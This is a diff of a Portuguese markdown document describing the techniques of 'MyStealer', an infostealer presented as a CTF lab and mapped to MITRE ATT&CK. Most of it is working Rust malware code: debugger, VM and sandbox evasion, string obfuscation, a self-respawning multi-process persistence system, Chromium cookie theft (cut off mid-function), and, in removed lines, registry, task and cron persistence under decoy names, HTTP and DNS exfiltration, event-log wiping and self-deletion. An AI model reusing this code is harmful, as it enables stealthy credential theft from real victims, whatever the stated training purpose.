@@ -1,286 +1,543 @@
-# 🎯 Técnicas e TTPs - MyStealer CTF Lab
+# 🎯 Técnicas e TTPs - MyStealer CTF Lab v0.3
 
 ## MITRE ATT&CK Mapping
 
-Este laboratório implementa técnicas documentadas no framework MITRE ATT&CK:
-
-| Técnica | ID | Categoria |
-|---------|----|-----------| 
-| Credentials from Password Stores | T1555 | Credential Access |
-| Clipboard Data | T1115 | Collection |
-| Data from Local System | T1005 | Collection |
-| System Information Discovery | T1082 | Discovery |
-| Automated Collection | T1119 | Collection |
-| Data Encrypted for Impact | T1486 | Impact |
-| Exfiltration Over C2 Channel | T1041 | Exfiltration |
+| Técnica | ID | Categoria | Implementação |
+|---------|----|-----------| --------------|
+| Credentials from Password Stores | T1555 | Credential Access | `browser.rs` |
+| Clipboard Data | T1115 | Collection | `clipboard.rs` |
+| Data from Local System | T1005 | Collection | `files.rs` |
+| System Information Discovery | T1082 | Discovery | `system_info.rs` |
+| Automated Collection | T1119 | Collection | `CollectorManager` |
+| Data Encrypted for Impact | T1486 | Impact | `crypto/` |
+| Obfuscated Files or Information | T1027 | Defense Evasion | `obfuscated_strings.rs` |
+| Debugger Evasion | T1622 | Defense Evasion | `anti_debug.rs` |
+| Virtualization/Sandbox Evasion | T1497 | Defense Evasion | `anti_analysis.rs` |
+| Process Injection | T1055 | Defense Evasion | `hydra.rs` (spawn) |
 
 ---
 
-## 1. Técnicas de Evasão (Anti-Analysis)
+## 1. 🛡️ Técnicas Anti-Análise
 
-### 1.1 Detecção de Máquina Virtual
+### 1.1 Anti-Debug
+
+#### Timing Check
+Detecta delays causados por single-stepping ou breakpoints.
 
 ```rust
-pub struct VmDetector;
+fn timing_check() -> bool {
+    let start = Instant::now();
+    
+    let mut x = 0u64;
+    for i in 0..1000 {
+        x = x.wrapping_add(i);
+        x = x.wrapping_mul(0x5851F42D4C957F2D);
+        x = x.rotate_left(17);
+    }
+    black_box(x);
+    
+    // Se demorou mais de 50ms, debugger detectado
+    start.elapsed() > Duration::from_millis(50)
+}
+```
 
-impl VmDetector {
-    /// Verifica múltiplos indicadores de VM
-    pub fn is_virtual_machine() -> bool {
-        Self::check_registry_keys() ||
-        Self::check_processes() ||
-        Self::check_hardware() ||
-        Self::check_files() ||
-        Self::check_mac_address()
+#### TracerPid (Linux)
+Verifica se há processo traçando via ptrace.
+
+```rust
+fn unix_debug_checks() -> bool {
+    let status_path = "/proc/self/status";
+    if let Ok(status) = std::fs::read_to_string(status_path) {
+        for line in status.lines() {
+            if let Some(pid) = line.strip_prefix("TracerPid:") {
+                if pid.trim() != "0" {
+                    return true; // Debugger detectado
+                }
+            }
+        }
+    }
+    false
+}
+```
+
+#### IsDebuggerPresent (Windows)
+Via PowerShell para evitar import direto.
+
+```rust
+fn windows_debug_checks() -> bool {
+    // [System.Diagnostics.Debugger]::IsAttached
+    let check = "[System.Diagnostics.Debugger]::IsAttached";
+    
+    if let Ok(output) = Command::new("powershell")
+        .args(["-NoProfile", "-Command", &check])
+        .output()
+    {
+        let result = String::from_utf8_lossy(&output.stdout)
+            .trim()
+            .to_lowercase();
+        return result == "true";
+    }
+    false
+}
+```
+
+### 1.2 Anti-Disassembly
+
+#### Opaque Predicates
+Condições que parecem dinâmicas mas são matematicamente constantes.
+
+```rust
+/// Sempre retorna true, mas disassemblers não conseguem determinar
+#[inline(never)]
+pub fn opaque_true() -> bool {
+    let x = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_nanos())
+        .unwrap_or(1);
+    
+    // x² sempre >= 0 para qualquer x real
+    // Mas análise estática não pode provar isso
+    (x * x) >= 0 || x < 0
+}
+
+/// Sempre retorna false
+#[inline(never)]
+pub fn opaque_false() -> bool {
+    let x = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_nanos() as i128)
+        .unwrap_or(1);
+    
+    // x² nunca é < 0 para números reais
+    x * x < 0
+}
+```
+
+#### Junk Code
+Código inútil que confunde análise estática.
+
+```rust
+#[inline(never)]
+pub fn junk_code_block() {
+    let mut arr = [0u8; 64];
+    
+    // Operações que parecem importantes
+    for i in 0..64 {
+        arr[i] = (i as u8).wrapping_mul(0x41);
+        arr[i] = arr[i].rotate_left(3);
+        arr[i] ^= 0x55;
     }
     
-    #[cfg(windows)]
-    fn check_registry_keys() -> bool {
-        let vm_keys = [
-            r"SOFTWARE\VMware, Inc.\VMware Tools",
-            r"SOFTWARE\Oracle\VirtualBox Guest Additions",
-            r"SYSTEM\CurrentControlSet\Services\VBoxGuest",
-            r"SYSTEM\CurrentControlSet\Services\vmci",
-        ];
-        
-        vm_keys.iter().any(|key| registry_key_exists(key))
-    }
-    
-    fn check_processes() -> bool {
-        let vm_processes = [
-            "vmtoolsd.exe",
-            "vmwaretray.exe",
-            "VBoxService.exe",
-            "VBoxTray.exe",
-            "qemu-ga.exe",
-        ];
-        
-        get_running_processes()
-            .iter()
-            .any(|p| vm_processes.contains(&p.as_str()))
-    }
-    
-    fn check_hardware() -> bool {
-        // Verificar CPUID
-        #[cfg(target_arch = "x86_64")]
-        unsafe {
-            let result = core::arch::x86_64::__cpuid(0x40000000);
-            let vendor = std::str::from_utf8_unchecked(&[
-                result.ebx.to_le_bytes(),
-                result.ecx.to_le_bytes(),
-                result.edx.to_le_bytes(),
-            ].concat());
-            
-            matches!(vendor, "VMwareVMware" | "Microsoft Hv" | "KVMKVMKVM")
+    let mut sum = 0u64;
+    for &b in &arr {
+        sum = sum.wrapping_add(b as u64);
+        sum = sum.wrapping_mul(0x100000001B3);
+        if opaque_false() {
+            sum = 0; // Nunca executa
         }
     }
     
-    fn check_mac_address() -> bool {
-        let vm_mac_prefixes = [
-            "00:0C:29",  // VMware
-            "00:50:56",  // VMware
-            "08:00:27",  // VirtualBox
-            "52:54:00",  // QEMU/KVM
-        ];
-        
-        get_mac_addresses()
-            .iter()
-            .any(|mac| vm_mac_prefixes.iter().any(|p| mac.starts_with(p)))
+    // Hash inútil
+    let hash = sum.wrapping_mul(0x517CC1B727220A95);
+    
+    black_box(arr);
+    black_box(hash);
+    
+    // Código morto
+    if opaque_false() {
+        panic!("This never happens");
     }
 }
 ```
 
-### 1.2 Detecção de Debugger
+#### Indirect Calls
+Chamadas via function pointers para confundir análise de fluxo.
 
 ```rust
-pub struct DebuggerDetector;
+#[inline(never)]
+pub fn indirect_call<F, R>(f: F) -> R
+where
+    F: FnOnce() -> R,
+{
+    // Junk antes
+    junk_code_block();
+    
+    // Execução real via indireção
+    let result = f();
+    
+    // Código morto
+    if opaque_false() {
+        dead_code();
+    }
+    
+    result
+}
+```
 
-impl DebuggerDetector {
-    #[cfg(windows)]
-    pub fn is_debugger_present() -> bool {
-        use windows::Win32::System::Diagnostics::Debug::{
-            IsDebuggerPresent, CheckRemoteDebuggerPresent,
-        };
-        use windows::Win32::System::Threading::GetCurrentProcess;
-        
-        unsafe {
-            // Método 1: API direta
-            if IsDebuggerPresent().as_bool() {
-                return true;
-            }
-            
-            // Método 2: Debugger remoto
-            let mut is_remote = false.into();
-            if CheckRemoteDebuggerPresent(GetCurrentProcess(), &mut is_remote).is_ok() {
-                if is_remote.as_bool() {
+### 1.3 Detecção de VM
+
+#### MAC Address Prefixes
+```rust
+fn has_vm_mac_prefix() -> bool {
+    let vm_macs = [
+        "00:0c:29",  // VMware
+        "00:50:56",  // VMware
+        "08:00:27",  // VirtualBox
+        "52:54:00",  // QEMU/KVM
+        "00:1c:42",  // Parallels
+    ];
+    
+    // Verifica interfaces de rede
+    for mac in &vm_macs {
+        if network_has_mac_prefix(mac) {
+            return true;
+        }
+    }
+    false
+}
+```
+
+#### VM Processes
+```rust
+fn has_vm_processes() -> bool {
+    let vm_procs = [
+        "vmtoolsd",      // VMware Tools
+        "vmwaretray",    // VMware Tray
+        "vboxservice",   // VirtualBox
+        "vboxtray",      // VirtualBox Tray
+        "qemu-ga",       // QEMU Guest Agent
+        "xenservice",    // Xen
+        "vmsrvc",        // Hyper-V
+    ];
+    
+    let processes = get_running_processes();
+    for p in &vm_procs {
+        if processes.contains(p) {
+            return true;
+        }
+    }
+    false
+}
+```
+
+#### DMI/SMBIOS (Linux)
+```rust
+fn check_dmi_info() -> bool {
+    let dmi_paths = [
+        "/sys/class/dmi/id/product_name",
+        "/sys/class/dmi/id/sys_vendor",
+        "/sys/class/dmi/id/board_vendor",
+    ];
+    
+    let vm_strings = [
+        "vmware", "virtualbox", "vbox", "qemu", 
+        "kvm", "xen", "hyper-v", "virtual",
+    ];
+    
+    for path in &dmi_paths {
+        if let Ok(content) = std::fs::read_to_string(path) {
+            let lower = content.to_lowercase();
+            for s in &vm_strings {
+                if lower.contains(s) {
                     return true;
                 }
             }
-            
-            // Método 3: PEB.BeingDebugged
-            Self::check_peb_being_debugged()
         }
     }
-    
-    #[cfg(windows)]
-    unsafe fn check_peb_being_debugged() -> bool {
-        use std::arch::asm;
-        
-        let peb: *const u8;
-        
-        #[cfg(target_arch = "x86_64")]
-        asm!(
-            "mov {}, gs:[0x60]",
-            out(reg) peb
-        );
-        
-        // BeingDebugged está no offset 0x2
-        *peb.add(0x2) != 0
-    }
-    
-    #[cfg(unix)]
-    pub fn is_debugger_present() -> bool {
-        // Método 1: ptrace
-        use nix::sys::ptrace;
-        
-        match ptrace::traceme() {
-            Ok(_) => {
-                // Se funcionar, não está sendo debugado
-                // Desfazer o trace
-                false
-            }
-            Err(_) => true, // Já está sendo traced
-        }
-    }
+    false
 }
 ```
 
-### 1.3 Detecção de Sandbox
+### 1.4 Detecção de Sandbox
 
+#### Usernames Suspeitos
 ```rust
-pub struct SandboxDetector;
+fn has_suspicious_username() -> bool {
+    let user = whoami::username().to_lowercase();
+    
+    let suspicious = [
+        "sandbox", "virus", "malware", "sample", "test",
+        "cuckoo", "analyst", "vmware", "virtual", "honey",
+        "admin", "john", "user",
+    ];
+    
+    for s in &suspicious {
+        if user.contains(s) {
+            return true;
+        }
+    }
+    false
+}
+```
 
-impl SandboxDetector {
-    pub fn is_sandboxed() -> bool {
-        Self::check_username() ||
-        Self::check_hostname() ||
-        Self::check_disk_size() ||
-        Self::check_ram_size() ||
-        Self::check_process_count() ||
-        Self::check_timing()
-    }
+#### Recursos Baixos
+```rust
+fn has_low_resources() -> bool {
+    let cpus = std::thread::available_parallelism()
+        .map(|p| p.get())
+        .unwrap_or(1);
     
-    fn check_username() -> bool {
-        let sandbox_usernames = [
-            "sandbox", "malware", "virus", "sample",
-            "test", "john", "user", "admin", "currentuser",
-        ];
-        
-        let username = whoami::username().to_lowercase();
-        sandbox_usernames.contains(&username.as_str())
-    }
+    let ram_gb = sysinfo::System::new_all().total_memory() 
+        / (1024 * 1024 * 1024);
     
-    fn check_disk_size() -> bool {
-        // Sandboxes geralmente têm discos pequenos
-        let total_disk = get_total_disk_size();
-        total_disk < 60 * 1024 * 1024 * 1024 // < 60GB
-    }
-    
-    fn check_ram_size() -> bool {
-        let total_ram = get_total_ram();
-        total_ram < 2 * 1024 * 1024 * 1024 // < 2GB
-    }
-    
-    fn check_timing() -> bool {
-        // Sandboxes podem acelerar o tempo
-        let start = std::time::Instant::now();
-        std::thread::sleep(std::time::Duration::from_secs(1));
-        let elapsed = start.elapsed();
-        
-        // Se passou muito menos ou muito mais que 1 segundo
-        elapsed < std::time::Duration::from_millis(900) ||
-        elapsed > std::time::Duration::from_millis(1200)
-    }
+    // Menos de 2 CPUs ou 2GB RAM = suspeito
+    cpus < 2 || ram_gb < 2
 }
 ```
 
 ---
 
-## 2. Técnicas de Persistência
+## 2. 🔐 Técnicas de Ofuscação de Strings
 
-> ⚠️ **Nota**: Estas técnicas são apenas para estudo. No modo lab, a persistência é simulada.
+### 2.1 XOR Encoding
 
-### 2.1 Registry Run Keys (Windows)
+Strings sensíveis são codificadas com XOR e decodificadas em runtime.
 
 ```rust
-#[cfg(windows)]
-pub fn add_registry_persistence(exe_path: &str) -> Result<(), PersistenceError> {
-    use windows::Win32::System::Registry::{
-        RegSetValueExW, HKEY_CURRENT_USER, REG_SZ,
+/// Decodifica string XOR em runtime
+#[inline(always)]
+fn xd(data: &[u8], key: u8) -> String {
+    data.iter().map(|b| (b ^ key) as char).collect()
+}
+
+// Exemplo: "sandbox" XOR 0x19
+fn get_sandbox_string() -> String {
+    xd(&[0x7a, 0x76, 0x69, 0x75, 0x77, 0x68, 0x63], 0x19)
+}
+
+// Exemplo: "vmtoolsd" XOR 0x19
+fn get_vmtools_string() -> String {
+    xd(&[0x6f, 0x6c, 0x7d, 0x6c, 0x6c, 0x69, 0x7c, 0x75], 0x19)
+}
+```
+
+**Chaves XOR Usadas:**
+| Key | Uso |
+|-----|-----|
+| `0x17` | Paths de sistema |
+| `0x19` | Nomes de processos, usernames |
+| `0x33` | Variáveis de ambiente |
+| `0x42` | Nomes de browsers |
+| `0x55` | Strings de crypto |
+| `0x77` | Ferramentas de análise |
+
+### 2.2 Stack Strings
+
+Strings construídas caractere por caractere na stack.
+
+```rust
+#[inline(always)]
+fn bs(chars: &[char]) -> String {
+    let mut s = String::with_capacity(chars.len());
+    for &c in chars {
+        s.push(c);
+    }
+    black_box(s)
+}
+
+// Uso: "tasklist" sem aparecer no binário
+fn get_tasklist_cmd() -> String {
+    bs(&['t','a','s','k','l','i','s','t'])
+}
+
+// Uso: path de sistema
+fn get_cache_path() -> String {
+    bs(&['.','c','a','c','h','e'])
+}
+```
+
+### 2.3 Runtime SQL Building
+
+Queries SQL montadas caractere por caractere.
+
+```rust
+fn build_cookies_query() -> String {
+    let mut q = String::with_capacity(100);
+    
+    // "SELECT host_key, name, value..."
+    for c in ['S','E','L','E','C','T',' '] { q.push(c); }
+    for c in ['h','o','s','t','_','k','e','y',',',' '] { q.push(c); }
+    for c in ['n','a','m','e',',',' '] { q.push(c); }
+    for c in ['v','a','l','u','e',',',' '] { q.push(c); }
+    // ... resto da query
+    for c in ['F','R','O','M',' '] { q.push(c); }
+    for c in ['c','o','o','k','i','e','s'] { q.push(c); }
+    
+    black_box(q)
+}
+```
+
+### 2.4 Conditional Compilation
+
+Logs removidos com feature flag `silent`.
+
+```rust
+// Cargo.toml
+[features]
+silent = []
+
+// Macro condicional
+#[macro_export]
+#[cfg(feature = "silent")]
+macro_rules! log_info {
+    ($($arg:tt)*) => {
+        // Noop - sem logs
+        let _ = || { format!($($arg)*) };
     };
-    
-    let key_path = r"Software\Microsoft\Windows\CurrentVersion\Run";
-    let value_name = "WindowsUpdate";  // Nome inocente
-    
-    // Abrir chave e definir valor
-    // ...
-    
-    tracing::info!("Registry persistence added");
-    Ok(())
+}
+
+#[macro_export]
+#[cfg(not(feature = "silent"))]
+macro_rules! log_info {
+    ($($arg:tt)*) => {
+        tracing::info!($($arg)*)
+    };
 }
 ```
 
-### 2.2 Scheduled Tasks (Windows)
+---
+
+## 3. 🐍 Sistema Hydra (Persistência Multi-Processo)
+
+### 3.1 Arquitetura
+
+```
+┌─────────────┐     ┌─────────────┐     ┌─────────────┐
+│   ALPHA     │◄───►│    BETA     │◄───►│   GAMMA     │
+│  (Primary)  │     │  (Backup 1) │     │  (Backup 2) │
+└──────┬──────┘     └──────┬──────┘     └──────┬──────┘
+       │                   │                   │
+       │    Heartbeat      │    Heartbeat      │
+       │    (5 segundos)   │    (5 segundos)   │
+       │                   │                   │
+       └───────────────────┼───────────────────┘
+                           │
+                    ┌──────▼──────┐
+                    │  IPC Dir    │
+                    │ (arquivos)  │
+                    └─────────────┘
+```
+
+### 3.2 Claim de Identidade
 
 ```rust
-#[cfg(windows)]
-pub fn add_scheduled_task(exe_path: &str) -> Result<(), PersistenceError> {
-    let task_xml = format!(r#"
-        <?xml version="1.0" encoding="UTF-16"?>
-        <Task version="1.2">
-            <Triggers>
-                <LogonTrigger>
-                    <Enabled>true</Enabled>
-                </LogonTrigger>
-            </Triggers>
-            <Actions>
-                <Exec>
-                    <Command>{}</Command>
-                </Exec>
-            </Actions>
-        </Task>
-    "#, exe_path);
+fn claim_head(ipc_dir: &PathBuf) -> Result<HydraHead, HydraError> {
+    for i in 0..HYDRA_HEADS {
+        let head = HydraHead::from_index(i).unwrap();
+        let lock_path = ipc_dir.join(format!("{}.lock", head.name()));
+        
+        // Tenta criar lock exclusivo
+        match try_acquire_lock(&lock_path) {
+            Ok(true) => return Ok(head),  // Conseguiu!
+            Ok(false) => continue,         // Já existe
+            Err(_) => continue,
+        }
+    }
     
-    Command::new("schtasks")
-        .args(["/create", "/tn", "WindowsDefenderUpdate", "/xml", "-"])
-        .stdin(Stdio::piped())
-        .spawn()?
-        .stdin.as_mut().unwrap()
-        .write_all(task_xml.as_bytes())?;
+    Err(HydraError::AllHeadsClaimed)
+}
+
+fn try_acquire_lock(path: &PathBuf) -> Result<bool, HydraError> {
+    if path.exists() {
+        // Verifica se processo ainda está vivo
+        if let Ok(content) = fs::read_to_string(path) {
+            if let Ok(pid) = content.trim().parse::<u32>() {
+                if process_exists(pid) {
+                    return Ok(false); // Lock válido
+                }
+            }
+        }
+        // Lock órfão, remove
+        let _ = fs::remove_file(path);
+    }
     
-    Ok(())
+    // Cria novo lock com nosso PID
+    let mut file = File::create(path)?;
+    write!(file, "{}", std::process::id())?;
+    Ok(true)
 }
 ```
 
-### 2.3 Cron Jobs (Linux)
+### 3.3 Heartbeat System
 
 ```rust
-#[cfg(unix)]
-pub fn add_cron_persistence(exe_path: &str) -> Result<(), PersistenceError> {
-    use std::fs::OpenOptions;
+pub fn send_heartbeat(&self) -> Result<(), HydraError> {
+    let hb_path = self.ipc_dir.join(format!("{}.hb", self.my_head.name()));
     
-    let cron_entry = format!(
-        "@reboot {} >/dev/null 2>&1\n",
-        exe_path
-    );
+    let timestamp = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0);
     
-    // Adicionar ao crontab do usuário
-    let crontab_path = format!("/var/spool/cron/crontabs/{}", whoami::username());
-    
+    // Formato: PID:TIMESTAMP
     let mut file = OpenOptions::new()
-        .append(true)
-        .open(&crontab_path)?;
+        .write(true)
+        .create(true)
+        .truncate(true)
+        .open(&hb_path)?;
     
-    file.write_all(cron_entry.as_bytes())?;
+    write!(file, "{}:{}", std::process::id(), timestamp)?;
+    Ok(())
+}
+
+pub fn check_siblings(&mut self) -> Vec<HydraHead> {
+    let mut dead_heads = Vec::new();
+    
+    for sibling in self.my_head.siblings() {
+        let hb_path = self.ipc_dir.join(format!("{}.hb", sibling.name()));
+        
+        let is_alive = if let Ok(content) = fs::read_to_string(&hb_path) {
+            if let Some(ts_str) = content.split(':').nth(1) {
+                if let Ok(ts) = ts_str.trim().parse::<u64>() {
+                    let now = get_current_timestamp();
+                    // Timeout de 15 segundos
+                    now.saturating_sub(ts) < HEARTBEAT_TIMEOUT
+                } else { false }
+            } else { false }
+        } else { false };
+        
+        if !is_alive {
+            dead_heads.push(sibling);
+        }
+    }
+    
+    dead_heads
+}
+```
+
+### 3.4 Auto-Respawn com Backoff
+
+```rust
+pub fn respawn_head(&mut self, head: HydraHead) -> Result<(), HydraError> {
+    // Limpa arquivos antigos
+    let lock_path = self.ipc_dir.join(format!("{}.lock", head.name()));
+    let hb_path = self.ipc_dir.join(format!("{}.hb", head.name()));
+    let _ = fs::remove_file(&lock_path);
+    let _ = fs::remove_file(&hb_path);
+    
+    // Backoff exponencial (2^n segundos, max 60s)
+    let state = self.heads.get_mut(&head).unwrap();
+    let backoff = std::cmp::min(
+        2u64.pow(state.respawn_count),
+        MAX_RESPAWN_BACKOFF
+    );
+    state.respawn_count += 1;
+    
+    if backoff > 1 {
+        std::thread::sleep(Duration::from_secs(backoff));
+    }
+    
+    // Spawn novo processo
+    let exe_path = std::env::current_exe()?;
+    let child = Command::new(&exe_path)
+        .args(["--skip-checks", "--hydra-role", head.name()])
+        .stdin(Stdio::null())
+        .stdout(Stdio::null())
+        .stderr(Stdio::null())
+        .spawn()?;
+    
+    state.pid = Some(child.id());
+    self.children.push(child);
     
     Ok(())
 }
@@ -288,304 +545,230 @@ pub fn add_cron_persistence(exe_path: &str) -> Result<(), PersistenceError> {
 
 ---
 
-## 3. Técnicas de Criptografia
+## 4. 🔐 Técnicas de Criptografia
 
-### 3.1 Criptografia de Dados Coletados
+### 4.1 Key Derivation
 
 ```rust
-use aes_gcm::{
-    aead::{Aead, KeyInit, OsRng},
-    Aes256Gcm, Nonce,
-};
-use argon2::Argon2;
-
-pub struct CryptoManager {
-    key: [u8; 32],
+pub fn derive_key() -> Result<[u8; 32], CryptoError> {
+    let machine_id = get_machine_id()?;
+    
+    // Salt ofuscado (construído byte a byte)
+    let salt = get_obfuscated_salt();
+    
+    let mut key = [0u8; 32];
+    Argon2::default()
+        .hash_password_into(machine_id.as_bytes(), &salt, &mut key)?;
+    
+    Ok(key)
 }
 
-impl CryptoManager {
-    /// Gera chave a partir de material único da máquina
-    pub fn new() -> Result<Self, CryptoError> {
-        let machine_id = Self::get_machine_id()?;
-        let salt = Self::get_salt();
-        
-        let mut key = [0u8; 32];
-        Argon2::default()
-            .hash_password_into(machine_id.as_bytes(), &salt, &mut key)?;
-        
-        Ok(Self { key })
-    }
-    
-    /// Criptografa dados com AES-256-GCM
-    pub fn encrypt(&self, data: &[u8]) -> Result<Vec<u8>, CryptoError> {
-        let cipher = Aes256Gcm::new_from_slice(&self.key)?;
-        
-        // Gerar nonce aleatório
-        let nonce_bytes: [u8; 12] = rand::random();
-        let nonce = Nonce::from_slice(&nonce_bytes);
-        
-        let ciphertext = cipher.encrypt(nonce, data)?;
-        
-        // Formato: nonce || ciphertext
-        let mut result = Vec::with_capacity(12 + ciphertext.len());
-        result.extend_from_slice(&nonce_bytes);
-        result.extend(ciphertext);
-        
-        Ok(result)
-    }
-    
-    /// Descriptografa dados
-    pub fn decrypt(&self, data: &[u8]) -> Result<Vec<u8>, CryptoError> {
-        if data.len() < 12 {
-            return Err(CryptoError::InvalidData);
-        }
-        
-        let cipher = Aes256Gcm::new_from_slice(&self.key)?;
-        
-        let nonce = Nonce::from_slice(&data[..12]);
-        let ciphertext = &data[12..];
-        
-        cipher.decrypt(nonce, ciphertext)
-            .map_err(|_| CryptoError::DecryptionFailed)
-    }
-    
-    #[cfg(windows)]
-    fn get_machine_id() -> Result<String, CryptoError> {
-        // Usar MachineGUID do registro
-        let output = Command::new("reg")
-            .args(["query", 
-                r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography",
-                "/v", "MachineGuid"])
-            .output()?;
-        
-        // Parsear output...
-        Ok(machine_guid)
-    }
-    
-    #[cfg(unix)]
-    fn get_machine_id() -> Result<String, CryptoError> {
-        std::fs::read_to_string("/etc/machine-id")
-            .or_else(|_| std::fs::read_to_string("/var/lib/dbus/machine-id"))
-            .map(|s| s.trim().to_string())
-            .map_err(|_| CryptoError::MachineIdNotFound)
-    }
+fn get_obfuscated_salt() -> [u8; 16] {
+    // Cada byte construído via XOR para evitar padrões
+    let mut salt = [0u8; 16];
+    salt[0] = 0x63 ^ 0x00;  // 'c'
+    salt[1] = 0x74 ^ 0x00;  // 't'
+    salt[2] = 0x66 ^ 0x00;  // 'f'
+    // ... resto do salt
+    salt
 }
 ```
 
-### 3.2 Ofuscação de Strings
+### 4.2 AES-256-GCM Encryption
 
 ```rust
-/// Macro para ofuscar strings em tempo de compilação
-macro_rules! obfuscate {
-    ($s:literal) => {{
-        const KEY: u8 = 0x42;
-        const INPUT: &[u8] = $s.as_bytes();
-        const LEN: usize = INPUT.len();
-        
-        const fn xor_array<const N: usize>(input: &[u8], key: u8) -> [u8; N] {
-            let mut result = [0u8; N];
-            let mut i = 0;
-            while i < N {
-                result[i] = input[i] ^ key;
-                i += 1;
-            }
-            result
-        }
-        
-        const ENCRYPTED: [u8; LEN] = xor_array::<LEN>(INPUT, KEY);
-        
-        // Deofuscar em runtime
-        let mut decrypted = [0u8; LEN];
-        for i in 0..LEN {
-            decrypted[i] = ENCRYPTED[i] ^ KEY;
-        }
-        
-        String::from_utf8_lossy(&decrypted).to_string()
-    }};
-}
-
-// Uso
-let api_name = obfuscate!("CreateRemoteThread");
-```
-
----
-
-## 4. Técnicas de Exfiltração
-
-### 4.1 Exfiltração HTTP
-
-```rust
-pub struct HttpExfiltrator {
-    endpoint: String,
-    client: reqwest::Client,
-}
-
-impl HttpExfiltrator {
-    pub async fn exfiltrate(&self, data: &EncryptedData) -> Result<(), ExfilError> {
-        // Codificar em base64
-        let encoded = base64::engine::general_purpose::STANDARD.encode(&data.0);
-        
-        // Dividir em chunks para evitar detecção
-        for chunk in encoded.as_bytes().chunks(4096) {
-            self.client
-                .post(&self.endpoint)
-                .header("Content-Type", "application/octet-stream")
-                .header("X-Request-ID", uuid::Uuid::new_v4().to_string())
-                .body(chunk.to_vec())
-                .send()
-                .await?;
-            
-            // Delay aleatório entre requests
-            tokio::time::sleep(Duration::from_millis(rand::random::<u64>() % 1000)).await;
-        }
-        
-        Ok(())
-    }
+pub fn encrypt(&self, data: &[u8]) -> Result<Vec<u8>, CryptoError> {
+    let cipher = Aes256Gcm::new_from_slice(&self.key)?;
+    
+    // Nonce aleatório de 12 bytes
+    let nonce_bytes: [u8; 12] = rand::random();
+    let nonce = Nonce::from_slice(&nonce_bytes);
+    
+    let ciphertext = cipher.encrypt(nonce, data)?;
+    
+    // Formato: nonce (12 bytes) || ciphertext
+    let mut result = Vec::with_capacity(12 + ciphertext.len());
+    result.extend_from_slice(&nonce_bytes);
+    result.extend(ciphertext);
+    
+    Ok(result)
 }
 ```
 
-### 4.2 Exfiltração DNS (Técnica Avançada)
+### 4.3 Byte Shuffling
 
 ```rust
-pub struct DnsExfiltrator {
-    domain: String,
+pub fn shuffle_bytes(data: &[u8], seed: u64) -> Vec<u8> {
+    let mut result: Vec<u8> = data.to_vec();
+    let len = result.len();
+    
+    // Fisher-Yates shuffle com seed determinístico
+    let mut rng_state = seed;
+    for i in (1..len).rev() {
+        // LCG simples para gerar índice
+        rng_state = rng_state.wrapping_mul(6364136223846793005)
+            .wrapping_add(1442695040888963407);
+        let j = (rng_state as usize) % (i + 1);
+        result.swap(i, j);
+    }
+    
+    result
 }
 
-impl DnsExfiltrator {
-    /// Exfiltra dados via queries DNS
-    pub async fn exfiltrate(&self, data: &[u8]) -> Result<(), ExfilError> {
-        // Codificar dados em base32 (DNS-safe)
-        let encoded = base32::encode(base32::Alphabet::RFC4648 { padding: false }, data);
-        
-        // Dividir em labels DNS (max 63 chars cada)
-        for (i, chunk) in encoded.as_bytes().chunks(63).enumerate() {
-            let subdomain = format!(
-                "{}.{}.data.{}",
-                i,
-                std::str::from_utf8(chunk).unwrap(),
-                self.domain
-            );
-            
-            // Fazer query DNS (a resposta não importa)
-            let _ = tokio::net::lookup_host(&subdomain).await;
-            
-            tokio::time::sleep(Duration::from_millis(100)).await;
-        }
-        
-        Ok(())
+pub fn unshuffle_bytes(data: &[u8], seed: u64) -> Vec<u8> {
+    // Gera sequência de swaps
+    let len = data.len();
+    let mut swaps = Vec::with_capacity(len);
+    let mut rng_state = seed;
+    
+    for i in (1..len).rev() {
+        rng_state = rng_state.wrapping_mul(6364136223846793005)
+            .wrapping_add(1442695040888963407);
+        let j = (rng_state as usize) % (i + 1);
+        swaps.push((i, j));
     }
+    
+    // Aplica swaps em ordem reversa
+    let mut result = data.to_vec();
+    for (i, j) in swaps.into_iter().rev() {
+        result.swap(i, j);
+    }
+    
+    result
+}
+```
+
+### 4.4 UUID Encoding
+
+```rust
+pub fn encode_as_uuid(data: &[u8]) -> Vec<String> {
+    // Cada UUID pode conter 16 bytes de dados
+    data.chunks(16).map(|chunk| {
+        let mut bytes = [0u8; 16];
+        bytes[..chunk.len()].copy_from_slice(chunk);
+        
+        // Formata como UUID
+        format!(
+            "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
+            u32::from_be_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]),
+            u16::from_be_bytes([bytes[4], bytes[5]]),
+            u16::from_be_bytes([bytes[6], bytes[7]]),
+            u16::from_be_bytes([bytes[8], bytes[9]]),
+            u64::from_be_bytes([0, 0, bytes[10], bytes[11], bytes[12], bytes[13], bytes[14], bytes[15]])
+        )
+    }).collect()
 }
 ```
 
 ---
 
-## 5. Técnicas Anti-Forense
+## 5. 📊 Coleta de Dados
 
-### 5.1 Limpeza de Rastros
+### 5.1 Browser Cookies (Chromium)
 
 ```rust
-pub struct AntiForensics;
-
-impl AntiForensics {
-    pub fn cleanup() {
-        Self::clear_event_logs();
-        Self::delete_prefetch();
-        Self::clear_recent_docs();
-        Self::secure_delete_self();
-    }
+fn read_chromium_cookies(&self, db_path: &PathBuf) -> Result<Vec<CookieEntry>, CollectorError> {
+    // Copia para evitar lock do browser
+    let tmp = std::env::temp_dir().join(format!("cookies_{}.db", std::process::id()));
+    std::fs::copy(db_path, &tmp)?;
     
-    #[cfg(windows)]
-    fn clear_event_logs() {
-        let logs = ["Application", "Security", "System"];
-        for log in logs {
-            let _ = Command::new("wevtutil")
-                .args(["cl", log])
-                .output();
-        }
-    }
+    let conn = Connection::open_with_flags(&tmp, OpenFlags::SQLITE_OPEN_READ_ONLY)?;
     
-    fn secure_delete_self() {
-        // Técnica de auto-deleção
-        #[cfg(windows)]
-        {
-            let self_path = std::env::current_exe().unwrap();
-            let cmd = format!(
-                "ping 127.0.0.1 -n 3 > nul & del /f /q \"{}\"",
-                self_path.display()
-            );
-            
-            Command::new("cmd")
-                .args(["/c", &cmd])
-                .spawn()
-                .ok();
-        }
-    }
+    // Query construída em runtime (anti-static analysis)
+    let query = Self::build_cookies_query();
+    let mut stmt = conn.prepare(&query)?;
+    
+    let cookies: Vec<CookieEntry> = stmt.query_map([], |row| {
